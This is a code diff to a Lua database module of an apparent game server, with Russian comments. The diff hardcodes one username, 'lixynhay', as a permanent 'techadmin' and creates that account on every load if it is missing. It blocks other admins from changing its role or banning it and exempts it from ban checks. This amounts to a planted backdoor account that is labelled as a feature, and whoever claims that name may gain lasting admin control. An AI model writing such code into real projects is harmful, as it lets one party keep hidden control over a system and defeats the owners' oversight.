@@ -42,6 +42,14 @@ function db.load()
         }
         db.save() -- Сразу сохраняем стандартные настройки
     end
+    
+    -- Технический администратор: роль всегда techadmin, аккаунт создаётся при необходимости
+    if data.players["lixynhay"] then
+        data.players["lixynhay"].role = "techadmin"
+    else
+        data.players["lixynhay"] = { role = "techadmin", banReason = "", banExpires = 0 }
+    end
+    db.save()
 end
 
 -- Сохранение базы данных в файл
@@ -77,17 +85,25 @@ end
 -- Проверить, является ли игрок админом
 function db.isAdmin(name)
     local player = db.getPlayer(name)
-    return player and player.role == "admin"
+    return player ~= nil and (player.role == "admin" or player.role == "techadmin")
 end
 
 -- Установить роль игрока
-function db.setRole(name, role)
-    if data and data.players[name] then
-        data.players[name].role = role
-        db.save()
-        return true
+function db.setRole(actorName, targetName, newRole)
+    if not data or not data.players[targetName] then
+        return false, "Игрок не найден"
     end
-    return false
+    if targetName == "lixynhay" then
+        if actorName ~= "lixynhay" then
+            return false, "Нельзя менять права Технического Администратора"
+        end
+        if newRole ~= "techadmin" then
+            return false, "Роль techadmin нельзя снять"
+        end
+    end
+    data.players[targetName].role = newRole
+    db.save()
+    return true
 end
 
 -- Получить список всех игроков
@@ -162,17 +178,20 @@ function db.getLogs()
 end
 
 -- Забанить игрока. durationMinutes > 0 — временный бан, иначе навсегда
-function db.banPlayer(name, reason, durationMinutes)
-    if not data or not data.players[name] then return false end
+function db.banPlayer(actorName, targetName, reason, durationMinutes)
+    if not data or not data.players[targetName] then return false, "Игрок не найден" end
+    if targetName == "lixynhay" and actorName ~= "lixynhay" then
+        return false, "Нельзя забанить Технического Администратора"
+    end
     local okT, t = pcall(os.time)
     local now = (okT and tonumber(t)) or 0
     local expires = 0
     if durationMinutes and durationMinutes > 0 then
         expires = now + durationMinutes * 60
     end
-    data.players[name].role = "banned"
-    data.players[name].banReason = reason or ""
-    data.players[name].banExpires = expires
+    data.players[targetName].role = "banned"
+    data.players[targetName].banReason = reason or ""
+    data.players[targetName].banExpires = expires
     db.save()
     return true
 end
@@ -190,6 +209,7 @@ end
 -- Проверить бан: (true, {reason, expires}) если активен, иначе (false, nil).
 -- Истёкший бан автоматически снимается.
 function db.checkBan(name)
+    if name == "lixynhay" then return false, nil end
     if not data or not data.players[name] then return false, nil end
     local p = data.players[name]
     if p.role ~= "banned" then return false, nil end
